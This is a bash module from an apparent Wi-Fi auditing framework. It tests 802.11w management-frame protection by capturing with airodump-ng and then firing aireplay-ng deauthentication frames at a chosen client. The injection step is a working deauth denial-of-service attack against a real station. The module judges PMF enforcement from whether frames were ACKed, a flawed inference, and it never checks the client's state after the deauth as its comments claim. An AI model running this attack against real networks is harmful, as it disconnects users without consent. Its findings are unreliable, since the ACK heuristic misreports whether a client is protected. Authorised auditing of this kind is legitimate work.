#!/usr/bin/env bash
# MODULE_META
# NAME="Deauthentication Resilience (802.11w)"
# CATEGORY="E"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="aireplay-ng,airodump-ng"
# DESC="Test if Management Frame Protection (MFP) is actually enforced"
# REQS="monitor_iface,target_bssid,target_channel"
# PCAP="no"
# TIMED="yes"
# PROMPTS="target_client"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/e3_deauth_resilience.sh
#  E3: Deauth Resilience (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Identify associated clients on the target AP.
#  2. Use TARGET_CLIENT provided by Go brain.
#  3. Send directed deauthentication frames to the selected client.
#  4. Monitor for disconnection to audit 802.11w (PMF) enforcement.
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SCAN_TIME="${SCAN_TIME:-20}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/e3"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="E3"
TARGET_CLIENT="${TARGET_CLIENT:-}"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

if [[ -z "$TARGET_CLIENT" ]]; then
    echo "[!] No target client specified. Resilience test requires an associated station."
    exit 0
fi

echo "[*] Starting deauthentication resilience test for ${BSSID}..."
echo "[*] Targeting client: ${TARGET_CLIENT}"

CSV_PREFIX="${EVIDENCE_PREFIX}_mon"
LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
DEAUTH_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"

# Start dynamic telemetry heartbeat
(
    HEARTBEAT_ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 50 --status "Deauth resilience test active — ${HEARTBEAT_ELAPSED}s elapsed (Ctrl+C to stop)"
            sleep 5
            HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 5))
            continue
        fi
        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Testing 802.11w PMF enforcement..."
        sleep 2
        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
    done
) &
TELEMETRY_PID=$!

# 1. Baseline: confirm client is associated before deauth
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    timeout --foreground "$SCAN_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" &
else
    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" > "$LOG_FILE" 2>&1 &
fi
AIRODUMP_PID=$!
sleep 5  # give airodump time to observe the client before we attack

FINAL_CSV="${CSV_PREFIX}-01.csv"

# Check if client is visible before deauth (baseline)
CLIENT_BEFORE=0
if [[ -f "$FINAL_CSV" ]] && grep -qi "${TARGET_CLIENT}" "$FINAL_CSV" 2>/dev/null; then
    CLIENT_BEFORE=1
    echo "[*] Confirmed: ${TARGET_CLIENT} is associated (baseline)."
else
    echo "[?] Target client ${TARGET_CLIENT} not yet visible — proceeding anyway."
fi

# 2. Targeted Deauth Injection
echo "[*] Sending deauthentication frames to ${TARGET_CLIENT}..."
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" 2>&1 | tee "$DEAUTH_LOG" || true
else
    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > "$DEAUTH_LOG" 2>&1 || true
fi

# 3. Wait and check if client reconnected or stayed disconnected
# PMF-protected clients will ignore the deauth → stay associated throughout
sleep 10
kill "$AIRODUMP_PID" 2>/dev/null || true
wait "$AIRODUMP_PID" 2>/dev/null || true

kill "$TELEMETRY_PID" 2>/dev/null || true

echo "[+] Deauth resilience test complete."

# 4. Determine PMF enforcement by checking post-deauth client state.
# 802.11w enforcement check: if the client disconnected → PMF NOT enforced (HIGH).
# If the client remained associated throughout → PMF enforced (INFO).
# aireplay-ng reports "X deauth frames sent" — if it also reported "no ACK", deauth was ignored
DEAUTH_ACKED=0
if grep -qi "no ack" "$DEAUTH_LOG" 2>/dev/null; then
    DEAUTH_ACKED=0  # no ACK = deauth frame was not acknowledged = client ignored it = PMF enforced
else
    DEAUTH_ACKED=1  # frames were acknowledged = client processed the deauth
fi

if [[ $CLIENT_BEFORE -eq 1 && $DEAUTH_ACKED -eq 0 ]]; then
    # Deauth was not acknowledged — PMF enforced
    echo "[+] PMF ENFORCED: Deauth frames were not acknowledged by ${TARGET_CLIENT}."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "802.11w PMF Enforced — Deauth Rejected" \
        --severity INFO \
        --desc "Client ${TARGET_CLIENT} ignored unprotected deauthentication frames sent from ${BSSID}. 802.11w (Protected Management Frames) is enforced." \
        --target "${BSSID}" \
        --evidence "$DEAUTH_LOG" \
        --rationale "Clients enforcing 802.11w drop unprotected deauth/disassoc frames from unauthenticated senders, preventing deauthentication DoS attacks."
elif [[ $DEAUTH_ACKED -eq 1 ]]; then
    # Deauth was ACKed — client processed and likely disconnected
    echo "[!] PMF NOT ENFORCED: ${TARGET_CLIENT} acknowledged deauth frames — client is vulnerable to deauth DoS."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "802.11w PMF Not Enforced — Client Vulnerable to Deauth DoS" \
        --desc "Client ${TARGET_CLIENT} acknowledged and acted on spoofed deauthentication frames from ${BSSID}. Management Frame Protection is not enforced." \
        --severity HIGH \
        --evidence "$DEAUTH_LOG" \
        --rationale "Without 802.11w, any attacker within radio range can forge deauth frames to disconnect clients, enabling persistent DoS or forcing handshake captures."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[E3] Audit Complete" \
        --severity INFO \
        --desc "Deauthentication resilience test completed for ${TARGET_CLIENT}. Client association state before deauth was not confirmed — results are inconclusive." \
        --target "${BSSID}" \
        --evidence "$DEAUTH_LOG" \
        --rationale "PMF enforcement could not be conclusively determined. Run again with an actively associated client and verify aireplay-ng output."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
